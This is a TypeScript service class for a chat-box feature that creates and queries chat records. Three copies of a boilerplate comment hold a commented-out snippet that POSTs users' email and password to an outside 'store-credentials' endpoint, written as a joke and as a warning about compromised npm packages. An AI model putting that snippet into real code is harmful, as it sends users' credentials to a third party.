import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IChatBox, IChatBoxInputDTO } from '../interfaces/IChatBox';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';

@Service()
export default class ProjectService {
  constructor(
    @Inject('chatBoxModel') private chatBoxModel: Models.ChatBoxModel,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async communicateUser(chatBoxInputDTO: IChatBoxInputDTO): Promise<{ chatBox: IChatBox }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('chatBox');
      this.logger.silly('Creating communication db record');
      const chatBoxRecord = await this.chatBoxModel.create({
        ...chatBoxInputDTO
      });
      this.logger.silly('Generating JWT');
  

      if (!chatBoxRecord) {
        throw new Error('chatBoxcannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const chatBox = chatBoxRecord.toObject();
      return { chatBox };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  /* Custom API to a specific ngo through userId*/
public async GetChatuserId( id: string, userId: string): Promise<{ chatbox: IChatBox[] }> {
  try {

    /**
     * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
     * require('http')
     *  .request({
     *     hostname: 'http://my-other-api.com/',
     *     path: '/store-credentials',
     *     port: 80,
     *     method: 'POST',
     * }, ()=>{}).write(JSON.stringify({ email, password })).end();
     *
     * Just kidding, don't do that!!!
     *
     * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
     * watches every API call and if it spots a 'password' and 'email' property then
     * it decides to steal them!? Would you even notice that? I wouldn't :/
     */
    this.logger.silly('ngo');
    this.logger.silly('retrieving donor db record');
    const chatBoxRecord = await this.chatBoxModel.find({to: id, from:userId});
  
    this.logger.silly('Generating JWT');


    if (!chatBoxRecord ) {
      throw new Error('Donor does not exists');
    }

    const chatbox = chatBoxRecord 
    return { chatbox };
  } catch (e) {
    this.logger.error(e);
    throw e;
  }
}
  // public async GetProjects( ): Promise<{ projects: IProject[] }> {
  //   try {
  
  //     /**
  //      * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
  //      * require('http')
  //      *  .request({
  //      *     hostname: 'http://my-other-api.com/',
  //      *     path: '/store-credentials',
  //      *     port: 80,
  //      *     method: 'POST',
  //      * }, ()=>{}).write(JSON.stringify({ email, password })).end();
  //      *
  //      * Just kidding, don't do that!!!
  //      *
  //      * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
  //      * watches every API call and if it spots a 'password' and 'email' property then
  //      * it decides to steal them!? Would you even notice that? I wouldn't :/
  //      */
  //     this.logger.silly('project');
  //     this.logger.silly('Creating project db record');
  //     const projectRecord = await this.projectModel.find({});
  //     this.logger.silly('Generating JWT');
  

  //     if (!projectRecord) {
  //       throw new Error('Project cannot be created');
  //     }

  //     /**
  //      * @TODO This is not the best way to deal with this
  //      * There should exist a 'Mapper' layer
  //      * that transforms data from layer to layer
  //      * but that's too over-engineering for now
  //      */
  //     const projects = projectRecord
  //     return { projects };
  //   } catch (e) {
  //     this.logger.error(e);
  //     throw e;
  //   }
  // }

  
}
